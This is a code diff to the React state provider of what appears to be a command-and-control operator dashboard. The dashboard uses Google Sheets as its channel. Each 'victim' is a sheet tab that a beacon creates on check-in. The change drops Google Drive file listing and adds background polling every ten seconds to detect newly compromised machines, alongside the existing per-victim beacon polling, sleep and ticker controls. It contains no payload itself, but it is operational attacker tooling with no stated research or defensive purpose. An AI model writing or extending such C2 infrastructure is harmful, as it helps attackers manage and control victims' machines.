@@ -5,13 +5,14 @@ const AppContext = createContext(null);
 
 // How often to poll while waiting for beacon response (ms)
 const POLL_INTERVAL_MS = 4000;
+// How often to refresh the victims list (new sheet tabs / beacons)
+const VICTIMS_POLL_INTERVAL_MS = 10000;
 // Stop polling after this many attempts (e.g. 75 × 4s = 5 min)
 const MAX_POLL_ATTEMPTS = 75;
 
 export function AppProvider({ children }) {
   const [config, setConfig] = useState({
-    sheetId: '', driveId: '', hasServiceAccount: false,
-    commandService: '', fileSystemService: '',
+    sheetId: '', hasServiceAccount: false,
   });
   const [configLoaded, setConfigLoaded] = useState(false);
   const [configError, setConfigError]   = useState(null);
@@ -19,15 +20,12 @@ export function AppProvider({ children }) {
   const [victims, setVictims]           = useState([]);
   const [activeVictim, setActiveVictim] = useState(null);
   const [rows, setRows]                 = useState([]);
-  const [driveFiles, setDriveFiles]     = useState([]);
   const [loading, setLoading]           = useState(false);
-  const [driveLoading, setDriveLoading] = useState(false);
   const [error, setError]               = useState(null);
   const [ticker, setTicker]             = useState(60);
   const [autoRefresh, setAutoRefresh]   = useState(false);
   const [lastRefresh, setLastRefresh]   = useState(null);
   const [showSettings, setShowSettings] = useState(false);
-  const [showDrive, setShowDrive]       = useState(false);
   const [sleepStatus, setSleepStatus]   = useState({});
   const [victimStatus, setVictimStatus] = useState({});
   // ── Smart polling state ───────────────────────────────────────────────────
@@ -281,36 +279,36 @@ export function AppProvider({ children }) {
   }, [isConfigured, rows, fetchRowsRaw, startPolling, stopPolling, sleepStatus, parseHHMMSS]);
 
   // ── Victims ───────────────────────────────────────────────────────────────
-  const fetchVictims = useCallback(async () => {
+  const fetchVictims = useCallback(async ({ silent = false } = {}) => {
     if (!isConfigured) return;
     try {
-      setLoading(true); setError(null);
+      if (!silent) {
+        setLoading(true);
+        setError(null);
+      }
       const res = await axios.get('/api/sheets/tabs');
       const tabs = res.data.tabs || [];
       setVictims(tabs);
-      if (!activeVictimRef.current && tabs.length > 0) {
+
+      const current = activeVictimRef.current;
+      if (!current && tabs.length > 0) {
         setActiveVictim(tabs[tabs.length - 1]);
+      } else if (current) {
+        const still = tabs.find((t) => t.id === current.id);
+        if (still) {
+          setActiveVictim(still);
+        } else if (tabs.length > 0) {
+          setActiveVictim(tabs[tabs.length - 1]);
+        } else {
+          setActiveVictim(null);
+        }
       }
     } catch (e) {
-      setError(e.response?.data?.error || e.message);
+      if (!silent) setError(e.response?.data?.error || e.message);
     } finally {
-      setLoading(false);
+      if (!silent) setLoading(false);
     }
   }, [isConfigured]);
-
-  // ── Drive ─────────────────────────────────────────────────────────────────
-  const fetchDriveFiles = useCallback(async () => {
-    if (!isConfigured || !config.driveId) return;
-    try {
-      setDriveLoading(true);
-      const res = await axios.get('/api/drive/files');
-      setDriveFiles(res.data.files || []);
-    } catch (e) {
-      setError(e.response?.data?.error || e.message);
-    } finally {
-      setDriveLoading(false);
-    }
-  }, [isConfigured, config.driveId]);
 
   const updateTicker = useCallback(async (value) => {
     if (!activeVictimRef.current || !isConfigured) return;
@@ -403,7 +401,13 @@ export function AppProvider({ children }) {
   }, []);
 
   // ── Effects ───────────────────────────────────────────────────────────────
-  useEffect(() => { if (isConfigured) fetchVictims(); }, [isConfigured]);
+  // Poll Google Sheets for new victim tabs (beacons create a tab on check-in)
+  useEffect(() => {
+    if (!isConfigured) return;
+    fetchVictims();
+    const id = setInterval(() => fetchVictims({ silent: true }), VICTIMS_POLL_INTERVAL_MS);
+    return () => clearInterval(id);
+  }, [isConfigured, fetchVictims]);
 
   useEffect(() => {
     if (activeVictim) {
@@ -419,11 +423,6 @@ export function AppProvider({ children }) {
     return () => clearInterval(id);
   }, [autoRefresh, ticker, activeVictim]);
 
-  // Drive files
-  useEffect(() => {
-    if (showDrive && config.driveId) fetchDriveFiles();
-  }, [showDrive]);
-
   // Cleanup poll on unmount
   useEffect(() => () => stopPolling(), []);
 
@@ -433,8 +432,7 @@ export function AppProvider({ children }) {
       configLoaded, configError,
       victims, activeVictim, setActiveVictim,
       rows, fetchRows,
-      driveFiles, fetchDriveFiles,
-      loading, driveLoading,
+      loading,
       error, setError,
       ticker, updateTicker,
       autoRefresh, setAutoRefresh,
@@ -443,7 +441,6 @@ export function AppProvider({ children }) {
       fetchVictims,
       isConfigured,
       showSettings, setShowSettings,
-      showDrive, setShowDrive,
       sleepStatus,
       victimStatus,
       parseHHMMSS,
